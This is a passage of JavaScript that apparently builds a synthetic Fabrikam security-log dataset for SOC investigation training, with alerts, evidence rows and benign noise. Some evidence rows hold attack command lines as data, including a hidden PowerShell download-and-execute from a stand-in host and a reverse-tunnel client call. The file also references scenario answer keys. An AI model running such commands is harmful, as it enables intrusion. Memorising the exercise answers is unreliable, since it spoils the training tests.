      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-HR-05', AccountName: 'lchen', AccountDomain: 'FABRIKAM', FileName: 'powershell.exe', ProcessCommandLine: 'powershell.exe -WindowStyle Hidden -NoProfile -Command "irm https://secure-captcha-verify.example/init.ps1 | iex"' });

    alert('alert-p19', vBase, 'Active scanning burst against known-exploited management-interface ports', 'Reconnaissance', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1595');
    evidence('alert-p19', vBase, 'Active scanning burst against known-exploited management-interface ports', 'T1595', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Device', EvidenceRole: 'Impacted', DeviceName: 'FAB-IT-01', RemoteIP: '203.0.113.87' });

    alert('alert-p20', twBase, 'Python runtime launched with reverse-tunnel client arguments', 'CommandAndControl', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1572');
    evidence('alert-p20', twBase, 'Python runtime launched with reverse-tunnel client arguments', 'T1572', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-FIN-11', AccountName: 'rpatel', AccountDomain: 'FABRIKAM', FileName: 'pythonw.exe', ProcessCommandLine: 'pythonw.exe client.py --server gitsync-relay.example --uuid ' + twUuid + ' cert.pem' });

    alert('alert-p21', fsBase, 'Legitimate updater utility running from a non-standard, user-writable cache folder', 'DefenseEvasion', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1574.001');
    evidence('alert-p21', fsBase, 'Legitimate updater utility running from a non-standard, user-writable cache folder', 'T1574.001', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-HR-02', AccountName: 'agomez', AccountDomain: 'FABRIKAM', FileName: 'AppUpdater.exe', FolderPath: 'C:\\Users\\agomez\\AppData\\Local\\AppUpdaterCache', ProcessCommandLine: 'AppUpdater.exe' });

    alert('alert-p22', hgBase, 'Windows-branded process launched by the shell from a non-standard, reported Run-key-persisted folder', 'Persistence', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1547.001');
    evidence('alert-p22', hgBase, 'Windows-branded process launched by the shell from a non-standard, reported Run-key-persisted folder', 'T1547.001', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-MKT-02', AccountName: 'mrivera', AccountDomain: 'FABRIKAM', FileName: 'winappx.exe', FolderPath: 'C:\\Users\\All Users\\MicrosoftDistribution\\sysmain', ProcessCommandLine: 'winappx.exe' });

    // Alerts for this round's 5-mission Beginner Fundamentals batch (Incidents Z/AA/BB/CC/DD above).
    alert('alert-p23', zBase, 'Credential-harvesting link email from a look-alike sending domain', 'InitialAccess', 'Medium',
      'Microsoft Defender for Office 365', 'Mail filter', 'T1566.002');
    evidence('alert-p23', zBase, 'Credential-harvesting link email from a look-alike sending domain', 'T1566.002', 'Microsoft Defender for Office 365', 'Mail filter',
      { EntityType: 'Mailbox', EvidenceRole: 'Impacted', AccountName: 'dkoval', AccountDomain: 'FABRIKAM', EmailSubject: 'Action required: verify your account password', NetworkMessageId: zNetId });

    alert('alert-p24', aaBase, 'Repeated failed sign-ins against one account from a single external IP, no success', 'CredentialAccess', 'Medium',
      'Microsoft Entra ID Protection', 'Identity Protection risk detection', 'T1110.001');
    evidence('alert-p24', aaBase, 'Repeated failed sign-ins against one account from a single external IP, no success', 'T1110.001', 'Microsoft Entra ID Protection', 'Identity Protection risk detection',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'rpatel@fabrikam.example', RemoteIP: AA_ATTACKER_IP });

    alert('alert-p25', bbBase, 'Macro-enabled spreadsheet spawned a command shell', 'Execution', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1204.002');
    evidence('alert-p25', new Date(bbBase.getTime() + 4 * 60000), 'Macro-enabled spreadsheet spawned a command shell', 'T1204.002', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-ENG-08', AccountName: 'ssingh', AccountDomain: 'FABRIKAM', FileName: 'cmd.exe', FolderPath: 'C:\\Windows\\System32', ProcessCommandLine: 'cmd.exe /c whoami' });

    alert('alert-p26', ccBase, 'User-run installer from Downloads, disguised as a browser updater', 'InitialAccess', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1189');
    evidence('alert-p26', ccBase, 'User-run installer from Downloads, disguised as a browser updater', 'T1189', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-EXEC-01', AccountName: 'cwoo', AccountDomain: 'FABRIKAM', FileName: 'Chrome_Update_Setup.exe', FolderPath: 'C:\\Users\\cwoo\\Downloads' });

    alert('alert-p27', ddBase, 'Successful sign-in on a dormant, long-unused account', 'InitialAccess', 'Medium',
      'Microsoft Entra ID Protection', 'Identity Protection risk detection', 'T1078');
    evidence('alert-p27', ddBase, 'Successful sign-in on a dormant, long-unused account', 'T1078', 'Microsoft Entra ID Protection', 'Identity Protection risk detection',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'bsanders@fabrikam.example', RemoteIP: '20.118.44.201' });

    alert('alert-p1', pSuccessTs, 'Credential stuffing: successful cloud sign-in after repeated failures', 'CredentialAccess', 'High',
      'Microsoft Entra ID Protection', 'Identity Protection risk detection', 'T1110.004');
    evidence('alert-p1', pSuccessTs, 'Credential stuffing: successful cloud sign-in after repeated failures', 'T1110.004', 'Microsoft Entra ID Protection', 'Identity Protection risk detection',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'ohansen@fabrikam.example', RemoteIP: ATTACKER_IP });
    alert('alert-p2', pLegitTs, 'Impossible travel to atypical location', 'InitialAccess', 'Medium',
      'Microsoft Entra ID Protection', 'Identity Protection risk detection', 'T1078.004');
    evidence('alert-p2', pLegitTs, 'Impossible travel to atypical location', 'T1078.004', 'Microsoft Entra ID Protection', 'Identity Protection risk detection',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'ohansen@fabrikam.example' });
    alert('alert-p3', pConsentTs, 'Suspicious OAuth consent granted by end user', 'Persistence', 'High',
      'Microsoft Defender for Cloud Apps', 'Cloud App Security policy', 'T1528');
    evidence('alert-p3', pConsentTs, 'Suspicious OAuth consent granted by end user', 'T1528', 'Microsoft Defender for Cloud Apps', 'Cloud App Security policy',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'ohansen@fabrikam.example', Application: 'DocuSign Connector', ApplicationId: hex(mulberry32(629), 32), OAuthApplicationId: hex(mulberry32(630), 32) });
    alert('alert-p4', pNatTs, 'Traffic to threat-intelligence flagged destination (C2)', 'CommandAndControl', 'High',
      'Microsoft Entra Internet Access', 'Global Secure Access threat intelligence', 'T1071');
    evidence('alert-p4', pNatTs, 'Traffic to threat-intelligence flagged destination (C2)', 'T1071', 'Microsoft Entra Internet Access', 'Global Secure Access threat intelligence',
      { EntityType: 'Url', EvidenceRole: 'Related', EvidenceDirection: 'Outbound', AccountUpn: 'ohansen@fabrikam.example', RemoteUrl: 'telemetry-sync-api.net' });

    // A fifth, correlated "case-level" AlertInfo/AlertEvidence row for Incident E — not a claim about a
    // specific real Microsoft table (AlertInfo/AlertEvidence are Defender XDR tables, reused loosely here
    // as this range's one alert-linked-mission mechanism across both Defender and Entra-sourced content,
    // same as alert-p1..p4 above). Represents the SOC correlating the 4 individual signals into one open
    // case — the entry point for the multi-step "start to finish" investigation mission. AttackTechniques
    // semicolon-joins multiple technique IDs, matching the real column's documented multi-value format
    // (already used for alert-a1 above).
    alert('alert-p5', pSuccessTs, 'Correlated case: coordinated identity compromise across sign-in, consent, and network signals', 'InitialAccess', 'High',
      'Microsoft Sentinel', 'Alert correlation across Entra ID Protection, Defender for Cloud Apps, and Global Secure Access', 'T1110.004;T1078.004;T1528;T1071');
    evidence('alert-p5', pSuccessTs, 'Correlated case: coordinated identity compromise across sign-in, consent, and network signals', 'T1110.004;T1078.004;T1528;T1071', 'Microsoft Sentinel', 'Alert correlation',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'ohansen@fabrikam.example' });

    alert('alert-u1', uSuccessTs, 'MFA fatigue: repeated authentication prompts before acceptance', 'CredentialAccess', 'High',
      'Microsoft Entra ID Protection', 'Identity Protection risk detection', 'T1621');
    evidence('alert-u1', uSuccessTs, 'MFA fatigue: repeated authentication prompts before acceptance', 'T1621', 'Microsoft Entra ID Protection', 'Identity Protection risk detection',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'tnowak@fabrikam.example', RemoteIP: MFA_ATTACKER_IP });

    alert('alert-m1', mCredTs, 'Correlated case: password spray against a legacy account followed by service principal credential addition', 'InitialAccess', 'High',
      'Microsoft Sentinel', 'Alert correlation across Entra ID Protection and Core Directory audit', 'T1110.003;T1078.004;T1098.001');
    evidence('alert-m1', mSuccessTs, 'Correlated case: password spray against a legacy account followed by service principal credential addition', 'T1110.003;T1078.004;T1098.001', 'Microsoft Entra ID Protection', 'Identity Protection risk detection',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'qatest01@fabrikam.example', RemoteIP: SPRAY_IP });
    evidence('alert-m1', mCredTs, 'Correlated case: password spray against a legacy account followed by service principal credential addition', 'T1110.003;T1078.004;T1098.001', 'Microsoft Entra ID Protection identity Protection', 'Core Directory audit',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'qatest01@fabrikam.example' });

    alert('alert-v1', vSigninTs, 'Suspicious password reset followed by anomalous sign-in success', 'InitialAccess', 'High',
      'Microsoft Sentinel', 'Alert correlation across Core Directory audit and Entra ID Protection', 'T1656;T1566.004');
    evidence('alert-v1', vResetTs, 'Suspicious password reset followed by anomalous sign-in success', 'T1656;T1566.004', 'Microsoft Entra ID', 'Core Directory audit',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'lchen@fabrikam.example' });
    evidence('alert-v1', vSigninTs, 'Suspicious password reset followed by anomalous sign-in success', 'T1656;T1566.004', 'Microsoft Entra ID Protection', 'Identity Protection risk detection',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'lchen@fabrikam.example', RemoteIP: '203.0.113.140' });

    // ---------- Additional background noise: a normal corporate network is far louder than any
    // curated storyline needs it to be, and a few of this range's "obviously suspicious" artifacts
    // (powershell.exe existing at all, any LogonFailed existing at all, external IPs outside the
    // Azure-ish 20.x.x.x block) previously had NO benign counterpart anywhere in the baseline, which
    // makes naive category filters accidentally look precise. This block only ADDS rows, using its
    // own independently-seeded RNG (never the shared `rng` above), so it cannot perturb the timing,
    // device assignment, or any other value any existing storyline/decoy/scenario already depends on
    // — verified by re-running verify-scenarios.js after this block was added (0 regressions).
    const rngNoise = mulberry32(90210);

    // FAB-FIN-07 (Incident A: the powershell.exe/cdn-update-delivery.net beacon) and FAB-IT-01 /
    // svc_backup (Incident B: the brute-force) are deliberately left OUT of the two noise categories
    // below (benign PowerShell, benign failed logons) — several scenarios' solutionQueries filter on
    // exactly "this device + this FileName" or "this account + LogonFailed" and assert a specific row
    // count or join cardinality; adding more of the same on those specific device/account would change
    // those counts. Every other device/account is fair game. (Verified: see verify-scenarios.js.)
    const NOISE_SAFE_DEVICES = DEVICES.filter(d => d.name !== 'FAB-FIN-07' && d.name !== 'FAB-IT-01');

    // Legitimate PowerShell usage: routine IT/DevOps scripting, unrelated to any incident or existing
    // decoy. Ordinary, unencoded, unhidden command lines — the opposite shape of the attacker's
    // `-nop -w hidden -enc ...` pattern, so "FileName == powershell.exe" alone stops being a tell.
    const BENIGN_PS_CMDLINES = [
      'powershell.exe -Command Get-Service | Where-Object {$_.Status -eq "Stopped"}',
      'powershell.exe -File C:\\Scripts\\Get-DiskSpaceReport.ps1',
      'powershell.exe -Command Get-ADUser -Filter * -Properties LastLogonDate',
      'powershell.exe -File C:\\Scripts\\Rotate-BackupLogs.ps1',
      'powershell.exe -Command Restart-Service -Name Spooler',
      'powershell.exe -File C:\\Scripts\\Sync-OneDriveReport.ps1',
      'powershell.exe -Command Get-EventLog -LogName System -Newest 50',
      'powershell.exe -File C:\\Scripts\\Check-CertExpiry.ps1',
    ];
    for (let i = 0; i < 60; i++) {
      const dev = pick(rngNoise, NOISE_SAFE_DEVICES);
      const hoursAgo = rngNoise() * 120;
      DeviceProcessEvents.push({
        Timestamp: iso(hoursAgo), DeviceName: dev.name, ActionType: 'ProcessCreated',
        FileName: 'powershell.exe', FolderPath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0',
        SHA1: hex(rngNoise, 40), ProcessId: 1000 + Math.floor(rngNoise() * 8000),
        ProcessCommandLine: pick(rngNoise, BENIGN_PS_CMDLINES),
        AccountDomain: dev.domain, AccountName: dev.user,
        InitiatingProcessFileName: 'cmd.exe', InitiatingProcessAccountName: dev.user,
      });
    }

    // Everybody fat-fingers a password sometimes: scattered single/double LogonFailed events across
    // many different accounts, low volume per account, internal-only (no external RemoteIP), spread
    // across the window — so "any LogonFailed exists" stops being the brute-force tell; the real
    // signal stays what it always was (7 failures then a success, all from the one external IP,
    // in under 6 minutes, against svc_backup specifically).
    const FAILURE_REASONS = ['Unknown user name or bad password', 'Account currently locked out'];
    for (let i = 0; i < 45; i++) {
      const dev = pick(rngNoise, NOISE_SAFE_DEVICES);
      const hoursAgo = rngNoise() * 120;
      DeviceLogonEvents.push({
        Timestamp: iso(hoursAgo), DeviceName: dev.name, ActionType: 'LogonFailed',
        LogonType: 'Interactive', AccountDomain: dev.domain, AccountName: dev.user,
        RemoteIP: '', IsLocalAdmin: false, FailureReason: pick(rngNoise, FAILURE_REASONS),
      });
    }

    // More baseline volume + IP-range diversity for benign network noise, so "external IP" alone
    // isn't a giveaway either (the two incident IPs, 203.0.113.55 and 198.51.100.23, are the only
    // ones in their /24s — real fleets talk to plenty of other external ranges all day).
    const BENIGN_IP_PREFIXES = ['20.', '52.', '13.', '104.'];
    for (let i = 0; i < 130; i++) {
      const dev = pick(rngNoise, DEVICES);
      const domain = pick(rngNoise, BENIGN_DOMAINS);
      const hoursAgo = rngNoise() * 120;
      DeviceNetworkEvents.push({
        Timestamp: iso(hoursAgo), DeviceName: dev.name, ActionType: 'ConnectionSuccess',
        RemoteIP: `${pick(rngNoise, BENIGN_IP_PREFIXES)}${Math.floor(rngNoise() * 200) + 1}.${Math.floor(rngNoise() * 200)}.${Math.floor(rngNoise() * 254) + 1}`,
        RemotePort: 443, RemoteUrl: domain, Protocol: 'Tcp',
        InitiatingProcessFileName: pick(rngNoise, BENIGN_PROCS).f, InitiatingProcessAccountName: dev.user,
      });
    }

    // More routine file and email traffic at the same baseline shape as the original generator —
    // just more of it, so browsing an unfiltered table doesn't feel sparse.
    const NOISE_FILE_NAMES = ['status-update.docx', 'expense-report.xlsx', 'team-photo.jpg', 'agenda.docx',
      'vendor-contract.pdf', 'presentation-draft.pptx', 'notes.txt', 'weekly-standup.docx'];
    for (let i = 0; i < 110; i++) {
      const dev = pick(rngNoise, DEVICES);
      const hoursAgo = rngNoise() * 120;
      DeviceFileEvents.push({
        Timestamp: iso(hoursAgo), DeviceName: dev.name, ActionType: pick(rngNoise, ['FileCreated', 'FileModified']),
        FileName: pick(rngNoise, NOISE_FILE_NAMES), FolderPath: `C:\\Users\\${dev.user}\\Documents`,
        SHA1: hex(rngNoise, 40), FileSize: Math.floor(rngNoise() * 500000) + 1000,
        InitiatingProcessFileName: pick(rngNoise, BENIGN_PROCS).f, InitiatingProcessAccountName: dev.user,
      });
    }
    const NOISE_SUBJECTS = ['Re: Q3 planning', 'Calendar invite: 1:1', 'FYI', 'Out of office next week',
      'Expense report approved', 'Building maintenance notice', 'New hire welcome'];
    for (let i = 0; i < 90; i++) {
      const dev = pick(rngNoise, DEVICES);
      const sender = pick(rngNoise, BENIGN_SENDERS);
      const hoursAgo = rngNoise() * 120;
      EmailEvents.push({
        Timestamp: iso(hoursAgo), NetworkMessageId: hex(rngNoise, 32),
        SenderFromAddress: sender.addr, SenderDisplayName: sender.name, SenderFromDomain: sender.domain,
        RecipientEmailAddress: `${dev.user}@fabrikam.example`, Subject: pick(rngNoise, NOISE_SUBJECTS),
        DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox/Folder',
        ThreatTypes: '', DetectionMethods: '', AttachmentCount: rngNoise() > 0.7 ? 1 : 0, UrlCount: rngNoise() > 0.8 ? 1 : 0,
      });
    }

    const deviceIdOf = (name) => {
      const rng2 = mulberry32(hashStr(name));
      return hex(rng2, 8) + '-' + hex(rng2, 4) + '-guid';
    };

    // Real SigninLogs has both TimeGenerated (ingestion time) and CreatedDateTime (the actual
    // sign-in moment — the column Microsoft's own docs filter on, e.g. `where CreatedDateTime >= ago(7d)`).
    // This synthetic dataset doesn't model ingestion lag, so CreatedDateTime mirrors TimeGenerated.
    SigninLogs.forEach(r => { if (r.TimeGenerated && !r.CreatedDateTime) r.CreatedDateTime = r.TimeGenerated; });

    return {
      DeviceProcessEvents: normalize(DeviceProcessEvents, SCHEMA_COLUMNS.DeviceProcessEvents, deviceIdOf),
      DeviceNetworkEvents: normalize(DeviceNetworkEvents, SCHEMA_COLUMNS.DeviceNetworkEvents, deviceIdOf),
      DeviceFileEvents: normalize(DeviceFileEvents, SCHEMA_COLUMNS.DeviceFileEvents, deviceIdOf),
      DeviceLogonEvents: normalize(DeviceLogonEvents, SCHEMA_COLUMNS.DeviceLogonEvents, deviceIdOf),
      EmailEvents: normalize(EmailEvents, SCHEMA_COLUMNS.EmailEvents, null),
      AlertInfo: normalize(AlertInfo, SCHEMA_COLUMNS.AlertInfo, null),
      AlertEvidence: normalize(AlertEvidence, SCHEMA_COLUMNS.AlertEvidence, deviceIdOf),
      SigninLogs: normalize(SigninLogs, SCHEMA_COLUMNS.SigninLogs, null),
      AuditLogs: normalize(AuditLogs, SCHEMA_COLUMNS.AuditLogs, null),
      NetworkAccessTraffic: normalize(NetworkAccessTraffic, SCHEMA_COLUMNS.NetworkAccessTraffic, null),
      NOW, DEVICES, SCHEMA_COLUMNS, MALICIOUS_TS, GROUND_TRUTH,
    };
  }

  function hashStr(s) { let h = 0; for (let i = 0; i < s.length; i++) { h = (Math.imul(31, h) + s.charCodeAt(i)) | 0; } return h >>> 0; }

  root.FabrikamData = { buildDataset, NOW, SCHEMA_COLUMNS };
})(typeof window !== 'undefined' ? window : (typeof module !== 'undefined' ? module.exports : this));
